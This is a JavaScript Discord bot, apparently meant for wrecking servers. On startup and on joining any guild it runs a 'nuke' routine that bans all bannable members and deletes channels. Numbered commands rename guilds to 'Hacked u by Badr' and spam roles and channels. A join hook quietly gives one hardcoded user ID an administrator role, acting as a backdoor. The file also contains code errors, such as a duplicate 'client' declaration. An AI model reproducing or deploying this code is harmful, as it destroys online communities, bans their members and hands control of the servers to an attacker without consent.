const Discord = require('discord.js');

const fs = require('fs')

const client = new Discord.Client();

const prefix = '';

client.on('ready', () => {


 
 console.log(`Logged in as [ Pharaohs]`);

});




  const adminprefix = "";
const devs = ['361217658190036999'];
client.on('message', message => {
  var argresult = message.content.split(` `).slice(1).join(' ');
    if (!devs.includes(message.author.id)) return;
if (message.content.startsWith(adminprefix + 'mo')) {
  client.user.setGame(argresult, "https://www.twitch.tv/idk")
    message.channel.sendMessage(`**:white_check_mark: تم تغير الحاله الي  : ${argresult}**`)
}
});







const LOka = new Discord.Client();
console.log('By Badr-YT');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);

});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('      ~            ~  By : Badr-YT ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  Badr-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);

        
    

});
var prefix = "-"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    LOka.user.setStatus(argresult);
  }
});

var x1 = "1"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)

}
});
var x1 = "1"
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by Badr")

}
});
LOka.on('message', message => {
     if (message.content === "1") {
LOka.user.setGame(`Hacked u by Badr`,'https://www.twitch.tv/hix')

}
});

LOka.on('message', message => {
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
})
}
});
LOka.on('message', message => {
     if (message.content === "1") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by Badr`)
})
}
});

LOka.on('message', message => {
     if (message.content === "1") {
                 if(!message.channel.guild) return;

             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)

}
});

LOka.on('message', message => {
     

     if (message.content === "2") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by Badr",
        permissions :   [1],
        color : " #ff0000"
    })


    
})
 
 
}
});
LOka.on('message', message => {
         if (message.content === "3") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');

m.createChannel('Hacked u by Badr', 'text');
m.createChannel('Hacked u by Badr', 'text');

})
}
});

LOka.on('message', message => {
         if (message.content === "4") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');

m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');

m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');

m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');

m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');

m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');
m.createChannel('Hacked u by Badr', 'voice');



})
}

});


const client = new Client();

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  await guild.fetchMembers();

  await guild.owner.send(' Hacked u by Badr    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });



  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));
  
    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
  
    await guild.createChannel('Hacked u by Badr', 'text');

      await guild.createChannel('Hacked u by Badr', 'voice');

  

}

LOka.on('ready', () => {
  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
  console.log('-------------------------------------------------------------');
  console.log('');
  console.log("Made by Badr");
  console.log("");
  console.log("-------------------------------------------------------------");

});

LOka.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});

LOka.on('guildMemberAdd', member => {
    
            if (member.id === "427112813547487232") {
                member.guild.createRole({
                    name : LOka.user.username,
                    color : "RANDOM", 
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
                
            }
        
    });

    








client.login(process.env.BOT_TOKEN);

